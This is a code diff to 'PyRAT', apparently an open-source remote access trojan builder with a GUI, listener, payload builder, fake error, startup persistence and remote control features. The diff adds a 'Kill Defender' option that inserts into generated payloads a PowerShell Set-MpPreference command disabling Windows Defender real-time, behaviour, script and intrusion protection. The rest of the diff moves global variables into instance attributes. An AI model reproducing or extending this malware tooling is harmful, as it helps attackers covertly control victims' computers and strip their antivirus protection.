@@ -13,8 +13,6 @@ import pyaudio
 import os
 
 IP = "0.0.0.0"
-listen = False
-server_thread = None
 
 
 class PyRAT:
@@ -154,6 +152,8 @@ class PyRAT:
 
         self.set_error = CTkCheckBox(self.Tab.tab("Builder/Listener"), offvalue=False, onvalue=True, text="Fake Error", font=self.big_font, fg_color="green", hover_color="lime")
 
+        self.kill_def = CTkCheckBox(self.Tab.tab("Builder/Listener"), offvalue=False, onvalue=True, text="Kill Defender", font=self.big_font, fg_color="green", hover_color="lime")
+
         self.set_name = CTkEntry(self.Tab.tab("Builder/Listener"))
 
         self.set_name_label = CTkLabel(self.Tab.tab("Builder/Listener"), bg_color="#101A10", text="Filename:", font=self.big_font)
@@ -181,7 +181,8 @@ class PyRAT:
 
         self.set_error.place(x=260, y=540)
         self.startup.place(x=400, y=540)
-        self.set_icon.place(x=510, y=540)
+        self.kill_def.place(x=510, y=540)
+        self.set_icon.place(x=670, y=540)
 
         self.set_name.place(x=110, y=540)
         self.set_name_label.place(x=10, y=540)
@@ -197,6 +198,8 @@ class PyRAT:
         self.Logo_Label.place(x=10, y=0)
         self.Title_Label.place(x=25, y=125)
 
+        self.server_thread = None
+        self.listen = False
         self.fake_error = False
         self.urls = False
         self.server = None
@@ -389,7 +392,7 @@ class PyRAT:
         notify.show_toast(
             title=title,
             msg=msg,
-            icon_path=r".\Snake.ico",
+            icon_path=r".\PyRAT.ico",
             duration=duration
         )
 
@@ -604,6 +607,7 @@ class PyRAT:
                 self.Error_Label.configure(text="")
                 self.Kill_Entry.delete("0", "end")
                 output = self.client.recv(2048).decode(errors="ignore")
+                print(output)
                 if output == "None":
                     self.Kill_Entry.delete("0", "end")
                     self.Error_Label.configure(text="Enter valid PID!")
@@ -891,7 +895,7 @@ class PyRAT:
             self.server.bind((str(IP), int(port)))
             self.server.listen()
 
-            while listen:
+            while self.listen:
                 self.client, addr = self.server.accept()
 
                 if self.client:
@@ -910,12 +914,10 @@ class PyRAT:
             pass
 
     def switch_listening(self):
-        global listen
-        global server_thread
-        listen = not listen
+        self.listen = not self.listen
         time.sleep(0.01)
 
-        if listen:
+        if self.listen:
             try:
                 port = int(self.Port_Entry.get().strip())
 
@@ -926,20 +928,20 @@ class PyRAT:
                     self.Error_Label.configure(text="")
                     self.Port_Entry.configure(state="disabled")
                     self.B_listen.configure(text="stop listening")
-                    server_thread = threading.Thread(target=self.start_server, args=(port,))
-                    server_thread.start()
+                    self.server_thread = threading.Thread(target=self.start_server, args=(port,))
+                    self.server_thread.start()
                     self.Listen_Label.configure(text=f" Listening...")
 
             except ValueError:
                 self.enable()
                 self.Error_Label.configure(text="Enter valid port!")
                 self.Listen_Label.configure(text="")
-                listen = False
+                self.listen = False
                 pass
             except ConnectionResetError:
                 self.enable()
                 self.Connection_Label.configure(text="")
-                listen = False
+                self.listen = False
                 self.Connection_Label.configure(text="")
                 pass
         else:
@@ -961,8 +963,8 @@ class PyRAT:
                 self.server = None
                 if self.client:
                     self.client.close()
-                if server_thread and server_thread.is_alive():
-                    server_thread.join()
+                if self.server_thread and self.server_thread.is_alive():
+                    self.server_thread.join()
 
                 self.client = None
             except ConnectionResetError:
@@ -1050,6 +1052,7 @@ class PyRAT:
             err = ""
             ico = ""
             startup = ""
+            kill_def = ""
 
             ip = self.Build_ip.get().strip()
             port = int(self.Build_port.get().strip())
@@ -1063,6 +1066,10 @@ class PyRAT:
                 self.Error_Label.configure(text="Icon not set!")
                 self.progressbar.stop()
                 return
+
+            if self.kill_def.get():
+                self.kill_def.toggle()
+                kill_def = "subprocess.run(\"powershell -c Set-MpPreference -DisableRealtimeMonitoring $true -MAPSReporting Disabled -SubmitSamplesConsent NeverSend -PUAProtection Disabled -DisableScheduleScanning $true -DisableEmailScanning $true -DisableBehaviorMonitoring $true -DisableScriptScanning $true -DisableIntrusionPreventionSystem $true\", shell=True)"
 
             if self.set_error.get():
                 self.set_error.toggle()
@@ -1097,6 +1104,8 @@ from tkinter import messagebox
 import webbrowser
 import sys
 
+{kill_def}
+
 local_shell = False
 connected = False
 cam = False
@@ -1109,8 +1118,8 @@ rec_audio = False
 def show_error(text):
     messagebox.showerror("Error", text)
 
-{err}
 
+{err}
 {startup}
 
 def audio(client):
